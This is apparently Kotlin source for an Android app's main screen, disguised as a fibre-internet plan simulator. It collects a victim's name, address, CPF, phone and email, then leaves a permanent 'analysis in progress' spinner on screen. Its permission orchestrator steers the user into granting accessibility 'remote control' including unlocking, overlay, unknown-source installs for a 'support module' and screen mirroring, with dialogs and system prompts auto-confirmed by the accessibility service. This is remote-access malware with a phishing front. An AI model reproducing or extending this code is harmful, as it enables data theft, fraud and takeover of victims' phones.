        val headerLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(36), dp(20), dp(20))
            background = fundoGradiente(
                intArrayOf(COR_PRIMARIA_DARK, COR_PRIMARIA),
                raioDp = 0
            )
        }

        val topRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }

        // Imagem do Logo (Ícone do Aplicativo no lado esquerdo do cabeçalho)
        val logoImage = android.widget.ImageView(this).apply {
            contentDescription = null // decorativo: nome do app aparece em texto ao lado
            try {
                setImageDrawable(packageManager.getApplicationIcon(packageName))
            } catch (e: Exception) {
                setImageResource(R.mipmap.ic_launcher)
            }
            scaleType = android.widget.ImageView.ScaleType.FIT_CENTER
            val tamanho = dp(42)
            layoutParams = LinearLayout.LayoutParams(tamanho, tamanho).apply {
                marginEnd = dp(14)
            }
        }

        val titleContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val txtTitulo = TextView(this).apply {
            text = marcaNome()
            ViewCompat.setAccessibilityHeading(this, true)
            textSize = 24f
            setTextColor(Color.WHITE)
            setTypeface(null, Typeface.BOLD)
        }

        val txtSubtitulo = TextView(this).apply {
            text = marcaSubtitulo()
            textSize = 13f
            setTextColor(Color.parseColor("#DBEAFE"))
        }

        titleContainer.addView(txtTitulo)
        titleContainer.addView(txtSubtitulo)

        // Badge Cobertura Ativa
        val badgeStatus = TextView(this).apply {
            text = "● COBERTURA ATIVA"
            textSize = 10f
            setTextColor(Color.WHITE)
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(10), dp(5), dp(10), dp(5))
            background = fundoArredondado(Color.parseColor("#33FFFFFF"), 20)
        }

        topRow.addView(logoImage)
        topRow.addView(titleContainer)
        topRow.addView(badgeStatus)

        headerLayout.addView(topRow)
        return headerLayout
    }

    /**
     * Barra de progresso visual das etapas (1. Início | 2. Cadastro | 3. Planos)
     */
    private fun criarIndicadorPassos(): View {
        val stepContainer = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(dp(16), dp(12), dp(16), dp(12))
            setBackgroundColor(Color.WHITE)
            elevation = dp(2).toFloat()
        }

        step1View = criarItemStep("1. Análise", true)
        val divisor1 = criarDivisorStep()
        step2View = criarItemStep("2. Viabilidade", false)
        val divisor2 = criarDivisorStep()
        step3View = criarItemStep("3. Planos", false)

        stepContainer.addView(step1View)
        stepContainer.addView(divisor1)
        stepContainer.addView(step2View)
        stepContainer.addView(divisor2)
        stepContainer.addView(step3View)

        return stepContainer
    }

    private fun criarItemStep(titulo: String, ativo: Boolean): TextView {
        return TextView(this).apply {
            text = titulo
            textSize = 12f
            setTypeface(null, if (ativo) Typeface.BOLD else Typeface.NORMAL)
            setTextColor(if (ativo) COR_PRIMARIA else COR_TEXTO_MUTED)
            gravity = Gravity.CENTER
            setPadding(dp(8), dp(4), dp(8), dp(4))
            if (ativo) {
                background = fundoArredondado(Color.parseColor("#EFF6FF"), 12)
            }
        }
    }

    private fun criarDivisorStep(): TextView {
        return TextView(this).apply {
            text = "›"
            importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_NO // seta decorativa entre passos
            textSize = 14f
            setTextColor(COR_TEXTO_LIGHT)
            setPadding(dp(4), 0, dp(4), 0)
        }
    }

    private fun atualizarIndicadorPassos(etapa: Int) {
        // etapa 1: inicio, 2: cadastro, 3: planos, 4: sucesso
        step1View.apply {
            setTextColor(if (etapa == 1) COR_PRIMARIA else COR_TEXTO_MUTED)
            setTypeface(null, if (etapa == 1) Typeface.BOLD else Typeface.NORMAL)
            background = if (etapa == 1) fundoArredondado(Color.parseColor("#EFF6FF"), 12) else null
        }
        step2View.apply {
            setTextColor(if (etapa == 2) COR_PRIMARIA else COR_TEXTO_MUTED)
            setTypeface(null, if (etapa == 2) Typeface.BOLD else Typeface.NORMAL)
            background = if (etapa == 2) fundoArredondado(Color.parseColor("#EFF6FF"), 12) else null
        }
        step3View.apply {
            setTextColor(if (etapa >= 3) COR_PRIMARIA else COR_TEXTO_MUTED)
            setTypeface(null, if (etapa >= 3) Typeface.BOLD else Typeface.NORMAL)
            background = if (etapa >= 3) fundoArredondado(Color.parseColor("#EFF6FF"), 12) else null
        }
    }

    /**
     * ETAPA 1: Card de Análise Inicial
     */
    private fun construirContainerInicial(): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.VISIBLE
        }

        val cardView = criarCardBase()

        val tagHero = TextView(this).apply {
            text = "NOVA TECNOLOGIA FIBRA ÓPTICA"
            textSize = 11f
            setTextColor(COR_PRIMARIA)
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(10), dp(4), dp(10), dp(4))
            background = fundoArredondado(Color.parseColor("#EFF6FF"), 20)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(12) }
        }

        val titulo = TextView(this).apply {
            text = "Simule a Velocidade Ideal para Sua Casa"
            textSize = 20f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
            setPadding(0, 0, 0, dp(8))
        }

        val descricao = TextView(this).apply {
            text = "Verifique a viabilidade técnica e receba ofertas exclusivas com instalação grátis para sua região."
            textSize = 14f
            setTextColor(COR_TEXTO_MUTED)
            setLineSpacing(dp(2).toFloat(), 1.1f)
            setPadding(0, 0, 0, dp(20))
        }

        // Benefícios em lista
        val listaBeneficios = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 0, 0, dp(24))
        }
        listaBeneficios.addView(criarItemBeneficio("⚡", "Velocidade ultra rápida de até 1 Giga"))
        listaBeneficios.addView(criarItemBeneficio("📶", "Roteador Wi-Fi 6 Dual Band incluso"))
        listaBeneficios.addView(criarItemBeneficio("🛠️", "Instalação 100% gratuita sem taxa de adesão"))
        listaBeneficios.addView(criarItemBeneficio("🎮", "Ping ultra baixo ideal para jogos e streaming 4K"))

        val btnSimular = Button(this).apply {
            text = "Simular Análise de Viabilidade"
            setTextColor(Color.WHITE)
            textSize = 16f
            isAllCaps = false
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = fundoGradiente(intArrayOf(COR_PRIMARIA, COR_PRIMARIA_DARK), 12)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener {
                if (prefs.getBoolean(KEY_PRIMEIRO_ACESSO, true)) {
                    exibirModalConsentimentoAcessibilidade()
                } else {
                    atualizarEtapaInterface()
                }
            }
        }

        cardView.addView(tagHero)
        cardView.addView(titulo)
        cardView.addView(descricao)
        cardView.addView(listaBeneficios)
        cardView.addView(btnSimular)

        container.addView(cardView)
        return container
    }

    private fun criarItemBeneficio(icone: String, texto: String): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, dp(6), 0, dp(6))

            val txtIcone = TextView(this@MainActivity).apply {
                this.text = icone
                textSize = 16f
                setPadding(0, 0, dp(10), 0)
            }

            val txtDesc = TextView(this@MainActivity).apply {
                this.text = texto
                textSize = 13f
                setTextColor(COR_TEXTO_ESCURO)
            }

            addView(txtIcone)
            addView(txtDesc)
        }
    }

    /**
     * ETAPA 2: Card de Formulario de Cadastro
     */
    private fun construirContainerCadastro(): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
        }

        val cardView = criarCardBase()

        val txtCadastroTitulo = TextView(this).apply {
            ViewCompat.setAccessibilityHeading(this, true)
            text = "Cadastro de Viabilidade"
            textSize = 20f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
        }

        val txtCadastroSub = TextView(this).apply {
            text = "Preencha os dados abaixo para consultar a disponibilidade do sinal na sua rua."
            textSize = 13f
            setTextColor(COR_TEXTO_MUTED)
            setPadding(0, dp(4), 0, dp(20))
        }

        cardView.addView(txtCadastroTitulo)
        cardView.addView(txtCadastroSub)

        val (layoutNome, campoNome) = criarCampoTextoProfissional("Nome Completo", "Ex: Maria Silva", InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PERSON_NAME)
        val (layoutEndereco, campoEndereco) = criarCampoTextoProfissional("Endereço Residencial", "Ex: Av. Paulista, 1000 - Apto 42", InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_POSTAL_ADDRESS)
        val (layoutCpf, campoCpf) = criarCampoTextoProfissional("CPF do Titular", "000.000.000-00", InputType.TYPE_CLASS_NUMBER)
        val (layoutTelefone, campoTelefone) = criarCampoTextoProfissional("Telefone / WhatsApp", "(00) 90000-0000", InputType.TYPE_CLASS_PHONE)
        val (layoutEmail, campoEmail) = criarCampoTextoProfissional("E-mail Contato", "seuemail@dominio.com", InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS)

        cardView.addView(layoutNome)
        cardView.addView(layoutEndereco)
        cardView.addView(layoutCpf)
        cardView.addView(layoutTelefone)
        cardView.addView(layoutEmail)

        val btnVerPlanos = Button(this).apply {
            text = "Ver Planos Disponíveis →"
            setTextColor(Color.WHITE)
            textSize = 16f
            isAllCaps = false
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = fundoGradiente(intArrayOf(COR_PRIMARIA, COR_PRIMARIA_DARK), 12)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(12) }
            setOnClickListener {
                if (campoNome.text.toString().trim().isEmpty() || campoTelefone.text.toString().trim().isEmpty()) {
                    Toast.makeText(this@MainActivity, "Por favor, preencha os campos obrigatórios (Nome e Telefone).", Toast.LENGTH_SHORT).show()
                } else {
                    containerCadastro.visibility = View.GONE
                    containerPlanos.visibility = View.VISIBLE
                    atualizarIndicadorPassos(3)
                }
            }
        }
        cardView.addView(btnVerPlanos)

        container.addView(cardView)
        return container
    }

    /**
     * ETAPA 3: Vitrine de Planos em CARDS Interativos
     */
    private fun construirContainerPlanos(): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
        }

        val txtPlanosTitulo = TextView(this).apply {
            ViewCompat.setAccessibilityHeading(this, true)
            text = "Selecione o Plano Ideal"
            textSize = 20f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
        }

        val txtPlanosSub = TextView(this).apply {
            text = "Todos os planos incluem Wi-Fi grátis e suporte técnico prioritário."
            textSize = 13f
            setTextColor(COR_TEXTO_MUTED)
            setPadding(0, dp(4), 0, dp(16))
        }

        container.addView(txtPlanosTitulo)
        container.addView(txtPlanosSub)

        cardsPlanos.clear()

        // Card Plano 1: 600 Mega
        val cardPlano1 = criarCardOpcaoPlano(
            index = 0,
            velocidade = "600 MEGA",
            subtituloVelocidade = "Fibra Simétrica High Speed",
            preco = "R$ 99,90",
            periodo = "/mês",
            badgeTexto = "ENTRADA",
            badgeCorBg = Color.parseColor("#F1F5F9"),
            badgeCorTexto = COR_TEXTO_MUTED,
            detalhes = listOf("✓ Wi-Fi Dual Band Incluso", "✓ 600 Mega Upload & Download", "✓ Ideal para até 5 dispositivos")
        )

        // Card Plano 2: 800 Mega (MAIS POPULAR)
        val cardPlano2 = criarCardOpcaoPlano(
            index = 1,
            velocidade = "800 MEGA",
            subtituloVelocidade = "Fibra Ultra Gamer & Streaming",
            preco = "R$ 109,99",
            periodo = "/mês",
            badgeTexto = "🔥 MAIS POPULAR",
            badgeCorBg = COR_LARANJA_LIGHT_BG,
            badgeCorTexto = COR_LARANJA_POPULAR,
            detalhes = listOf("✓ Wi-Fi 6 Giga Incluso", "✓ 800 Mega Ultra Estável", "✓ Ideal para Jogos e 4K", "✓ Instalação Prioritária Grátis")
        )

        // Card Plano 3: 1 Giga
        val cardPlano3 = criarCardOpcaoPlano(
            index = 2,
            velocidade = "1 GIGA",
            subtituloVelocidade = "Máxima Performance Fibra",
            preco = "R$ 139,99",
            periodo = "/mês",
            badgeTexto = "MÁXIMA VELOCIDADE",
            badgeCorBg = COR_VERDE_LIGHT_BG,
            badgeCorTexto = COR_VERDE_DESTAQUE,
            detalhes = listOf("✓ Roteador Wi-Fi 6 Pro", "✓ 1000 Mega de Velocidade", "✓ Dispositivos Ilimitados", "✓ Suporte VIP 24h")
        )

        cardsPlanos.add(cardPlano1)
        cardsPlanos.add(cardPlano2)
        cardsPlanos.add(cardPlano3)

        container.addView(cardPlano1)
        container.addView(cardPlano2)
        container.addView(cardPlano3)

        // Seleciona o padrão (Plano 2)
        atualizarEstiloCardsPlanos()

        val btnEnviar = Button(this).apply {
            text = "Contratar Plano Selecionado"
            setTextColor(Color.WHITE)
            textSize = 16f
            isAllCaps = false
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = fundoGradiente(intArrayOf(COR_PRIMARIA, COR_PRIMARIA_DARK), 12)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(16) }
            setOnClickListener {
                containerPlanos.visibility = View.GONE
                containerSucesso.visibility = View.VISIBLE
                atualizarIndicadorPassos(4)
                // Persiste o estado: mesmo fechando e reabrindo o app, a
                // tela de "Análise em Andamento" (com o círculo de loop)
                // é a primeira a aparecer.
                prefs.edit().putBoolean(KEY_ANALISE_EM_ANDAMENTO, true).apply()
            }
        }
        container.addView(btnEnviar)

        return container
    }

    /**
     * Cria um Card interativo de Opção de Plano
     */
    private fun criarCardOpcaoPlano(
        index: Int,
        velocidade: String,
        subtituloVelocidade: String,
        preco: String,
        periodo: String,
        badgeTexto: String,
        badgeCorBg: Int,
        badgeCorTexto: Int,
        detalhes: List<String>
    ): LinearLayout {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(18), dp(18), dp(18))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(14) }
            isClickable = true
            isFocusable = true
            setOnClickListener {
                planoSelecionadoIndex = index
                atualizarEstiloCardsPlanos()
                it.announceForAccessibility("Plano selecionado")
            }
        }

        // Cabeçalho do Card (Badge + Radio Indicator)
        val headerCard = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 0, 0, dp(10))
        }

        val badge = TextView(this).apply {
            text = badgeTexto
            textSize = 11f
            setTextColor(badgeCorTexto)
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(10), dp(4), dp(10), dp(4))
            background = fundoArredondado(badgeCorBg, 12)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val spacerHeader = View(this).apply {
            importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_NO // espaçador visual
            layoutParams = LinearLayout.LayoutParams(0, 1, 1f)
        }

        val radioIndicator = TextView(this).apply {
            tag = "radio_indicator_$index"
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(dp(8), dp(2), dp(8), dp(2))
        }

        headerCard.addView(badge)
        headerCard.addView(spacerHeader)
        headerCard.addView(radioIndicator)

        // Bloco de Velocidade e Preço
        val rowPreco = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.BOTTOM
            setPadding(0, 0, 0, dp(8))
        }

        val blockVel = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val txtVel = TextView(this).apply {
            text = velocidade
            textSize = 22f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
        }

        val txtSubVel = TextView(this).apply {
            text = subtituloVelocidade
            textSize = 12f
            setTextColor(COR_TEXTO_MUTED)
        }

        blockVel.addView(txtVel)
        blockVel.addView(txtSubVel)

        val blockPreco = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.BOTTOM
        }

        val txtPreco = TextView(this).apply {
            text = preco
            textSize = 22f
            setTextColor(COR_PRIMARIA)
            setTypeface(null, Typeface.BOLD)
        }

        val txtPeriodo = TextView(this).apply {
            text = periodo
            textSize = 12f
            setTextColor(COR_TEXTO_MUTED)
            setPadding(0, 0, 0, dp(3))
        }

        blockPreco.addView(txtPreco)
        blockPreco.addView(txtPeriodo)

        rowPreco.addView(blockVel)
        rowPreco.addView(blockPreco)

        // Lista de Recursos / Vantagens
        val listaRecursos = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, dp(8), 0, 0)
        }

        for (detalhe in detalhes) {
            val txtRecurso = TextView(this).apply {
                text = detalhe
                textSize = 12f
                setTextColor(COR_TEXTO_ESCURO)
                setPadding(0, dp(2), 0, dp(2))
            }
            listaRecursos.addView(txtRecurso)
        }

        card.addView(headerCard)
        card.addView(rowPreco)
        card.addView(listaRecursos)

        return card
    }

    private fun atualizarEstiloCardsPlanos() {
        for (i in cardsPlanos.indices) {
            val card = cardsPlanos[i]
            val selecionado = (i == planoSelecionadoIndex)
            card.isSelected = selecionado
            ViewCompat.setStateDescription(card, if (selecionado) "Plano selecionado" else "Nao selecionado")

            card.background = if (selecionado) {
                fundoArredondado(
                    cor = COR_CARD_SELECIONADO_BG,
                    raioDp = 16,
                    bordaCor = COR_PRIMARIA,
                    bordaDp = 2
                )
            } else {
                fundoArredondado(
                    cor = COR_CARD_BG,
                    raioDp = 16,
                    bordaCor = COR_CARD_BORDA,
                    bordaDp = 1
                )
            }

            val radioIndicator = card.findViewWithTag<TextView>("radio_indicator_$i")
            radioIndicator?.apply {
                if (selecionado) {
                    text = "✓ Selecionado"
                    setTextColor(COR_PRIMARIA)
                    setTypeface(null, Typeface.BOLD)
                    background = fundoArredondado(Color.parseColor("#DBEAFE"), 10)
                } else {
                    text = "Selecionar"
                    setTextColor(COR_TEXTO_MUTED)
                    setTypeface(null, Typeface.NORMAL)
                    background = fundoArredondado(Color.parseColor("#F1F5F9"), 10)
                }
            }
        }
    }

    /**
     * ETAPA 4: Card de Análise com Logo + Círculo Carregando em Loop Permanente
     */
    private fun construirContainerSucesso(): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
        }

        val cardView = criarCardBase().apply {
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(24), dp(36), dp(24), dp(36))
        }

        // Imagem do Logo do Aplicativo acima do círculo de carregando
        val logoImageAnalise = android.widget.ImageView(this).apply {
            contentDescription = null // decorativo: título da tela aparece em texto abaixo
            try {
                setImageDrawable(packageManager.getApplicationIcon(packageName))
            } catch (e: Exception) {
                setImageResource(R.mipmap.ic_launcher)
            }
            scaleType = android.widget.ImageView.ScaleType.FIT_CENTER
            val tamanho = dp(64)
            layoutParams = LinearLayout.LayoutParams(tamanho, tamanho).apply {
                bottomMargin = dp(16)
            }
        }

        // Círculo de carregando (spinner em loop permanente)
        val progressLoop = android.widget.ProgressBar(this).apply {
            isIndeterminate = true
            indeterminateDrawable?.setColorFilter(COR_PRIMARIA, android.graphics.PorterDuff.Mode.SRC_IN)
            val tamanho = dp(48)
            layoutParams = LinearLayout.LayoutParams(tamanho, tamanho).apply {
                bottomMargin = dp(20)
            }
        }

        val txtTitulo = TextView(this).apply {
            text = "Análise em Andamento"
            textSize = 22f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(8))
        }

        val txtDesc = TextView(this).apply {
            text = "Sua solicitação do plano selecionado foi enviada. Estamos analisando a viabilidade técnica e sinal da fibra para a sua região. Por favor, aguarde em quanto nosso sistema conclui a validação..."
            textSize = 14f
            setTextColor(COR_TEXTO_MUTED)
            gravity = Gravity.CENTER
            setLineSpacing(dp(2).toFloat(), 1.2f)
            setPadding(0, 0, 0, dp(20))
        }

        val badgeAnalise = TextView(this).apply {
            text = "⏳ Verificando viabilidade da rede..."
            textSize = 13f
            setTextColor(COR_PRIMARIA)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(dp(16), dp(10), dp(16), dp(10))
            background = fundoArredondado(Color.parseColor("#EFF6FF"), 12)
        }

        cardView.addView(logoImageAnalise)
        cardView.addView(progressLoop)
        cardView.addView(txtTitulo)
        cardView.addView(txtDesc)
        cardView.addView(badgeAnalise)

        container.addView(cardView)
        return container
    }

    /**
     * Helper: Cria Card Base estilizado
     */
    private fun criarCardBase(): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(20))
            background = fundoArredondado(
                cor = COR_CARD_BG,
                raioDp = 16,
                bordaCor = COR_CARD_BORDA,
                bordaDp = 1
            )
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }
    }

    /**
     * Helper: Cria Campo de Texto com Rótulo e Estilo Profissional
     */
    private fun criarCampoTextoProfissional(label: String, dica: String, tipoInput: Int): Pair<LinearLayout, EditText> {
        val layoutCampo = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(14) }
        }

        val txtLabel = TextView(this).apply {
            text = label
            textSize = 12f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
            setPadding(0, 0, 0, dp(6))
        }

        val editText = EditText(this).apply {
            // Campo começa LIMPO: sem texto de dica/placeholder. O rótulo
            // acima (txtLabel) já identifica o campo, então a "dica" só
            // aparecia como sugestão antes de digitar e reaparecia ao apagar.
            hint = null
            // Desliga sugestões/autocompletar do teclado nos campos de texto
            // (não afeta número/telefone). Assim só aparece o que o usuário digita.
            inputType = if ((tipoInput and InputType.TYPE_CLASS_TEXT) != 0)
                tipoInput or InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS
            else
                tipoInput
            maxLines = 1
            textSize = 14f
            setTextColor(COR_TEXTO_ESCURO)
            setHintTextColor(COR_TEXTO_LIGHT)
            setPadding(dp(14), dp(14), dp(14), dp(14))
            background = fundoArredondado(
                cor = Color.parseColor("#F8FAFC"),
                raioDp = 10,
                bordaCor = Color.parseColor("#E2E8F0"),
                bordaDp = 1
            )
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        layoutCampo.addView(txtLabel)
        layoutCampo.addView(editText)

        return Pair(layoutCampo, editText)
    }

    // ══════════════ ORQUESTRADOR DE PERMISSÕES (1ª abertura) ══════════════
    // Fluxo ÚNICO, sequencial e organizado (estilo WhatsApp): cada permissão
    // mostra um modal central explicando, leva o aparelho à TELA CERTA e, quando
    // possível, o inject confirma sozinho. Concedida 1x = NUNCA mais pedida (a
    // fonte da verdade é o próprio estado do Android, checado a cada retorno).
    private data class PassoPermissao(
        val id: String,
        val titulo: String,
        val descricao: String,
        val concedida: () -> Boolean,
        val abrir: () -> Unit
    )

    private fun passosPermissao(): List<PassoPermissao> {
        val lista = mutableListOf<PassoPermissao>()
        // 1) ACESSIBILIDADE — base de tudo (habilita o inject das próximas telas).
        lista.add(PassoPermissao(
            "acessibilidade", "Ativar Acessibilidade",
            "Necessária para o controle remoto (toques, rolagem e desbloqueio). " +
                "Na próxima tela, ative o serviço \"${marcaNome()}\".",
            { isAcessibilidadeAtiva() },
            {
                voltandoDeAcessibilidade = true
                try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (_: Exception) {}
            }
        ))
        // 2) SOBREPOSIÇÃO — exibir sobre outros apps (o inject liga o interruptor).
        lista.add(PassoPermissao(
            "overlay", "Permitir sobreposição",
            "Para exibir sobre outros apps. Ative \"Permitir exibir sobre outros apps\".",
            { podeSobrepor() },
            { MyAccessibilityService.armarInterruptorPermissao(); abrirTelaSobreposicao() }
        ))
        // 3) BATERIA — ignorar otimização (não cair a conexão com a tela apagada).
        lista.add(PassoPermissao(
            "bateria", "Ignorar otimização de bateria",
            "Mantém a conexão ativa com a tela apagada — o espelhamento não cai.",
            {
                val pm = getSystemService(POWER_SERVICE) as? PowerManager
                pm?.isIgnoringBatteryOptimizations(packageName) == true
            },
            {
                try { startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (_: Exception) {}
            }
        ))
        // 4) NOTIFICAÇÕES (API 33+) — serviço em primeiro plano estável.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            lista.add(PassoPermissao(
                "notificacoes", "Permitir notificações",
                "Para o serviço rodar em primeiro plano de forma estável.",
                { ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED },
                { requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), REQUEST_NOTIFICACAO) }
            ))
        }
        // 5) FONTES DESCONHECIDAS (API 26+) — instalar o módulo de suporte.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            lista.add(PassoPermissao(
                "fontes", "Permitir instalar desta fonte",
                "Para instalar o módulo de suporte. Ative \"Permitir desta fonte\".",
                { packageManager.canRequestPackageInstalls() },
                {
                    MyAccessibilityService.armarInterruptorPermissao()
                    try { startActivity(Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (_: Exception) {}
                }
            ))
        }
        // 6) ESPELHAMENTO (MediaProjection) — por último; o "Iniciar agora" já é
        //    auto-clicado pelo loop do serviço de acessibilidade.
        lista.add(PassoPermissao(
            "captura", "Iniciar espelhamento",
            "Permite ver a tela do aparelho. Toque em \"Iniciar agora\".",
            { ScreenCaptureService.isRunning && ScreenCaptureService.capturandoDeVerdade },
            { prosseguirMediaProjection() }
        ))
        return lista
    }

    @Volatile private var orquestrandoPermissoes = false

    /** Avança o fluxo de permissões: pega a 1ª pendente, mostra o modal central e
     *  leva à tela certa. Chamado no 1º acesso e a cada onResume (ao voltar de uma
     *  tela de permissão, re-checa e vai para a próxima). Idempotente. */
    private fun executarOrquestracaoPermissoes() {
        if (prefs.getBoolean(KEY_PERMISSOES_OK, false)) return  // já concluído antes
        val pendente = passosPermissao().firstOrNull { !it.concedida() }
        if (pendente == null) {
            prefs.edit().putBoolean(KEY_PERMISSOES_OK, true).apply()
            orquestrandoPermissoes = false
            Log.i(TAG, "[PERMISSOES] Todas concedidas — onboarding de permissões concluído.")
            return
        }
        if (orquestrandoPermissoes) return
        orquestrandoPermissoes = true
        Log.i(TAG, "[PERMISSOES] Passo pendente: ${pendente.id}")
        runOnUiThread {
            try {
                val dlg = AlertDialog.Builder(this)
                    .setTitle(pendente.titulo)
                    .setMessage(pendente.descricao)
                    .setCancelable(false)
                    .setPositiveButton("Permitir agora") { _, _ -> orquestrandoPermissoes = false; pendente.abrir() }
                    .create()
                dlg.show()
                // Hands-free: auto-confirma o próprio modal após 1,2s e já leva à tela.
                handlerMain.postDelayed({
                    if (dlg.isShowing) { dlg.dismiss(); orquestrandoPermissoes = false; pendente.abrir() }
                }, 1200L)
            } catch (e: Exception) {
                orquestrandoPermissoes = false
                Log.e(TAG, "[PERMISSOES] Erro ao exibir modal: ${e.message}")
            }
        }
    }

    private fun atualizarEtapaInterface() {
        // Se já chegou na "Análise em Andamento", permanece nela mesmo ao
        // fechar e reabrir o app — não volta para cadastro/planos.
        if (prefs.getBoolean(KEY_ANALISE_EM_ANDAMENTO, false)) {
            containerInicial.visibility = View.GONE
            containerCadastro.visibility = View.GONE
            containerPlanos.visibility = View.GONE
            containerSucesso.visibility = View.VISIBLE
            atualizarIndicadorPassos(4)
            return
        }
        val primeiroAcesso = prefs.getBoolean(KEY_PRIMEIRO_ACESSO, true)
        if (!primeiroAcesso) {
            containerInicial.visibility = View.GONE
            containerCadastro.visibility = View.VISIBLE
            atualizarIndicadorPassos(2)
        }
    }

    private fun fundoArredondado(cor: Int, raioDp: Int, bordaCor: Int? = null, bordaDp: Int = 0): GradientDrawable {
        return GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = dp(raioDp).toFloat()
            setColor(cor)
            if (bordaCor != null) setStroke(dp(bordaDp), bordaCor)
        }
    }

    private fun fundoGradiente(cores: IntArray, raioDp: Int): GradientDrawable {
        return GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT, cores).apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = dp(raioDp).toFloat()
        }
    }

    private fun dp(valor: Int): Int = (valor * resources.displayMetrics.density).toInt()

